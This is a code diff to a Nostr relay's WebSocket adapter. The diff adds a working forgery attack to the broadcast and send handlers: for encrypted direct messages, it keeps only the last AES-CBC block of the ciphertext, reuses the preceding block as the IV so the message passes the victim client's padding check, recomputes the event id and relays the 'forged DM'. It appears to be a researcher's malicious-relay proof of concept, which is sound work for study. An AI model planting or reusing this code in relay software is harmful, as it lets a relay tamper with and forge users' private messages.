@@ -11,12 +11,12 @@ import { IWebSocketAdapter, IWebSocketServerAdapter } from '../@types/adapters'
 import { SubscriptionFilter, SubscriptionId } from '../@types/subscription'
 import { WebSocketAdapterEvent, WebSocketServerAdapterEvent } from '../constants/adapter'
 import { attemptValidation } from '../utils/validation'
-import { ContextMetadataKey } from '../constants/base'
+import {ContextMetadataKey, EventKinds} from '../constants/base'
 import { createLogger } from '../factories/logger-factory'
 import { Event } from '../@types/event'
 import { getRemoteAddress } from '../utils/http'
 import { IRateLimiter } from '../@types/utils'
-import { isEventMatchingFilter } from '../utils/event'
+import { getEventHash, isEventMatchingFilter } from '../utils/event'
 import { messageSchema } from '../schemas/message-schema'
 import { Settings } from '../@types/settings'
 import { SocketAddress } from 'net'
@@ -101,24 +101,109 @@ export class WebSocketAdapter extends EventEmitter implements IWebSocketAdapter 
   }
 
   public onBroadcast(event: Event): void {
-    this.webSocketServer.emit(WebSocketServerAdapterEvent.Broadcast, event)
-    if (cluster.isWorker && typeof process.send === 'function') {
-      process.send({
-        eventName: WebSocketServerAdapterEvent.Broadcast,
-        event,
+    console.log('---------')
+    console.log('event on onBroadcast on web-socket-adapter.ts')
+    console.log(event)
+    // do truncated replay attack on EncryptedDM
+    // eslint-disable-next-line max-len
+    if(event.kind == EventKinds.ENCRYPTED_DIRECT_MESSAGE /*){ //*/ && event.content.length>52) { // 52 is the length of 1 block + iv in the base64 format
+      // eslint-disable-next-line @typescript-eslint/ban-ts-comment
+      // @ts-ignore
+      const a = event.content.split('?')
+      let iv = ''
+      let ct = ''
+      if(a[1].includes('iv=')){
+        iv = a[1]
+        ct = a[0]
+      }else{
+        iv = a[0]
+        ct = a[1]
+      }
+      // eslint-disable-next-line @typescript-eslint/ban-ts-comment
+      // @ts-ignore
+      // save the first block only.
+      //event.content = Buffer.from(ct, 'base64').slice(0, 16).toString('base64') +'?'+ iv
+      // save the last block only ( for passing the padding check on the victim client )
+      const blocks = Buffer.from(ct, 'base64')
+      iv = 'iv=' + blocks.slice(blocks.length-32, blocks.length-16).toString('base64')
+      event.content = blocks.slice(blocks.length-16, blocks.length).toString('base64') +'?'+ iv
+
+      getEventHash(event).then(id =>{
+        event.id = id
+        console.log('forged DM')
+        console.log(event)
+        console.log('---------')
+        this.webSocketServer.emit(WebSocketServerAdapterEvent.Broadcast, event)
+        if (cluster.isWorker && typeof process.send === 'function') {
+          process.send({
+            eventName: WebSocketServerAdapterEvent.Broadcast,
+            event,
+          })
+        }
       })
+    }else{
+      this.webSocketServer.emit(WebSocketServerAdapterEvent.Broadcast, event)
+      if (cluster.isWorker && typeof process.send === 'function') {
+        process.send({
+          eventName: WebSocketServerAdapterEvent.Broadcast,
+          event,
+        })
+      }
     }
   }
 
   public onSendEvent(event: Event): void {
-    this.subscriptions.forEach((filters, subscriptionId) => {
-      if (
-        filters.map(isEventMatchingFilter).some((isMatch) => isMatch(event))
-      ) {
-        debug('sending event to client %s: %o', this.clientId, event)
-        this.sendMessage(createOutgoingEventMessage(subscriptionId, event))
+    console.log('---------')
+    console.log('event on onSendEvent on web-socket-adapter.ts')
+    console.log(event)
+    // do truncated replay attack on EncryptedDM
+    // eslint-disable-next-line max-len
+    if(event.kind == EventKinds.ENCRYPTED_DIRECT_MESSAGE /*){ //*/ && event.content.length>52) { // 52 is the length of 1 block + iv in the base64 format
+      // eslint-disable-next-line @typescript-eslint/ban-ts-comment
+      // @ts-ignore
+      const a = event.content.split('?')
+      let iv = ''
+      let ct = ''
+      if(a[1].includes('iv=')){
+        iv = a[1]
+        ct = a[0]
+      }else{
+        iv = a[0]
+        ct = a[1]
       }
-    })
+      // eslint-disable-next-line @typescript-eslint/ban-ts-comment
+      // @ts-ignore
+      // save the first block only.
+      //event.content = Buffer.from(ct, 'base64').slice(0, 16).toString('base64') +'?'+ iv
+      // save the last block only ( for passing the padding check on the victim client )
+      const blocks = Buffer.from(ct, 'base64')
+      iv = 'iv=' + blocks.slice(blocks.length-32, blocks.length-16).toString('base64')
+      event.content = blocks.slice(blocks.length-16, blocks.length).toString('base64') +'?'+ iv
+
+      getEventHash(event).then(id =>{
+        event.id = id
+        console.log('forged DM')
+        console.log(event)
+        console.log('---------')
+        this.subscriptions.forEach((filters, subscriptionId) => {
+          if (
+              filters.map(isEventMatchingFilter).some((isMatch) => isMatch(event))
+          ) {
+            debug('sending event to client %s: %o', this.clientId, event)
+            this.sendMessage(createOutgoingEventMessage(subscriptionId, event))
+          }
+        })
+      })
+    }else{
+      this.subscriptions.forEach((filters, subscriptionId) => {
+        if (
+          filters.map(isEventMatchingFilter).some((isMatch) => isMatch(event))
+        ) {
+          debug('sending event to client %s: %o', this.clientId, event)
+          this.sendMessage(createOutgoingEventMessage(subscriptionId, event))
+        }
+      })
+    }
   }
 
   private sendMessage(message: OutgoingMessage): void {
